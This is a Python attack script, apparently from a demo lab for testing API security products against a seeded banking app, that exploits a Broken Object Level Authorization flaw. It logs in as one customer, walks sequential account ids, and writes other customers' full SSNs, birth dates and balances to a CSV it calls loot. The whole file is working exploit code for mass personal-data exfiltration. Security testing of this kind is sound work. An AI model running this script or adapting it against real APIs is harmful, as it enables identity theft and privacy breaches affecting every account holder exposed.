"""
account_scraping.py — walk the BOLA account endpoint to exfiltrate PII.

Vuln / bot scenario:  GET /api/accounts/accounts/{id} has no ownership check and
                      uses sequential integer ids, and it returns EXCESSIVE data
                      (full SSN + date of birth + balance). Any logged-in
                      customer can harvest every account by counting 1..N.
F5 XC category:       API Security: Broken Object Level Authorization (BOLA) +
                      Sensitive Data Exposure  (mass data exfiltration).

Logs in as an ordinary customer, then walks ids and writes account_number,
ssn_full, date_of_birth, balance and currency into a CSV. Prints a truncated
sample so you can see the SSNs come back for accounts the caller does not own.

Usage:
    python3 account_scraping.py                       # ids 1..10 as alice
    python3 account_scraping.py --user bob --max-id 20 --out loot.csv
"""

import argparse
import csv
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import (BASE_URL, SEEDED_USERS, auth_headers, login, make_client)


def main():
    ap = argparse.ArgumentParser(description="BOLA account-scraping / PII exfil bot.")
    ap.add_argument("--user", default="alice", choices=list(SEEDED_USERS),
                    help="which seeded customer to log in as (proves no ownership check)")
    ap.add_argument("--start-id", type=int, default=1)
    ap.add_argument("--max-id", type=int, default=10)
    ap.add_argument("--out", default="scraped_accounts.csv")
    args = ap.parse_args()

    creds = SEEDED_USERS[args.user]
    print(f"Target: {BASE_URL}/api/accounts/accounts/{{id}}  (logged in as {args.user})")
    print(f"walking ids {args.start_id}..{args.max_id}\n")

    rows, start = [], time.time()
    with make_client() as client:
        token, _ = login(client, creds["email"], creds["password"])
        hdrs = auth_headers(token)
        for i in range(args.start_id, args.max_id + 1):
            try:
                r = client.get(f"/api/accounts/accounts/{i}", headers=hdrs)
            except Exception as exc:  # noqa: BLE001
                print(f"  id {i}: ERR {exc}")
                continue
            if r.status_code != 200:
                continue
            a = r.json()
            rows.append(a)

    elapsed = time.time() - start
    with open(args.out, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["id", "account_number", "user_id", "account_type", "currency",
                    "balance_cents", "date_of_birth", "ssn_full"])
        for a in rows:
            w.writerow([a.get("id"), a.get("account_number"), a.get("user_id"),
                        a.get("account_type"), a.get("currency"), a.get("balance_cents"),
                        a.get("date_of_birth"), a.get("ssn_full")])

    print("--- report ---")
    print(f"harvested: {len(rows)} accounts in {elapsed:.2f}s -> {args.out}")
    print(f"logged in as {args.user}, yet pulled SSNs for accounts owned by others.\n")
    print("sample stolen records (SSN truncated for the console; full value is in the CSV):")
    for a in rows[:5]:
        ssn = str(a.get("ssn_full", ""))
        masked = ("***-**-" + ssn[-4:]) if len(ssn) >= 4 else ssn
        print(f"  acct {a.get('id'):>3} {a.get('account_number'):<14} "
              f"{a.get('currency')} {a.get('balance_cents'):>10}  ssn={masked}  "
              f"dob={a.get('date_of_birth')}")


if __name__ == "__main__":
    main()
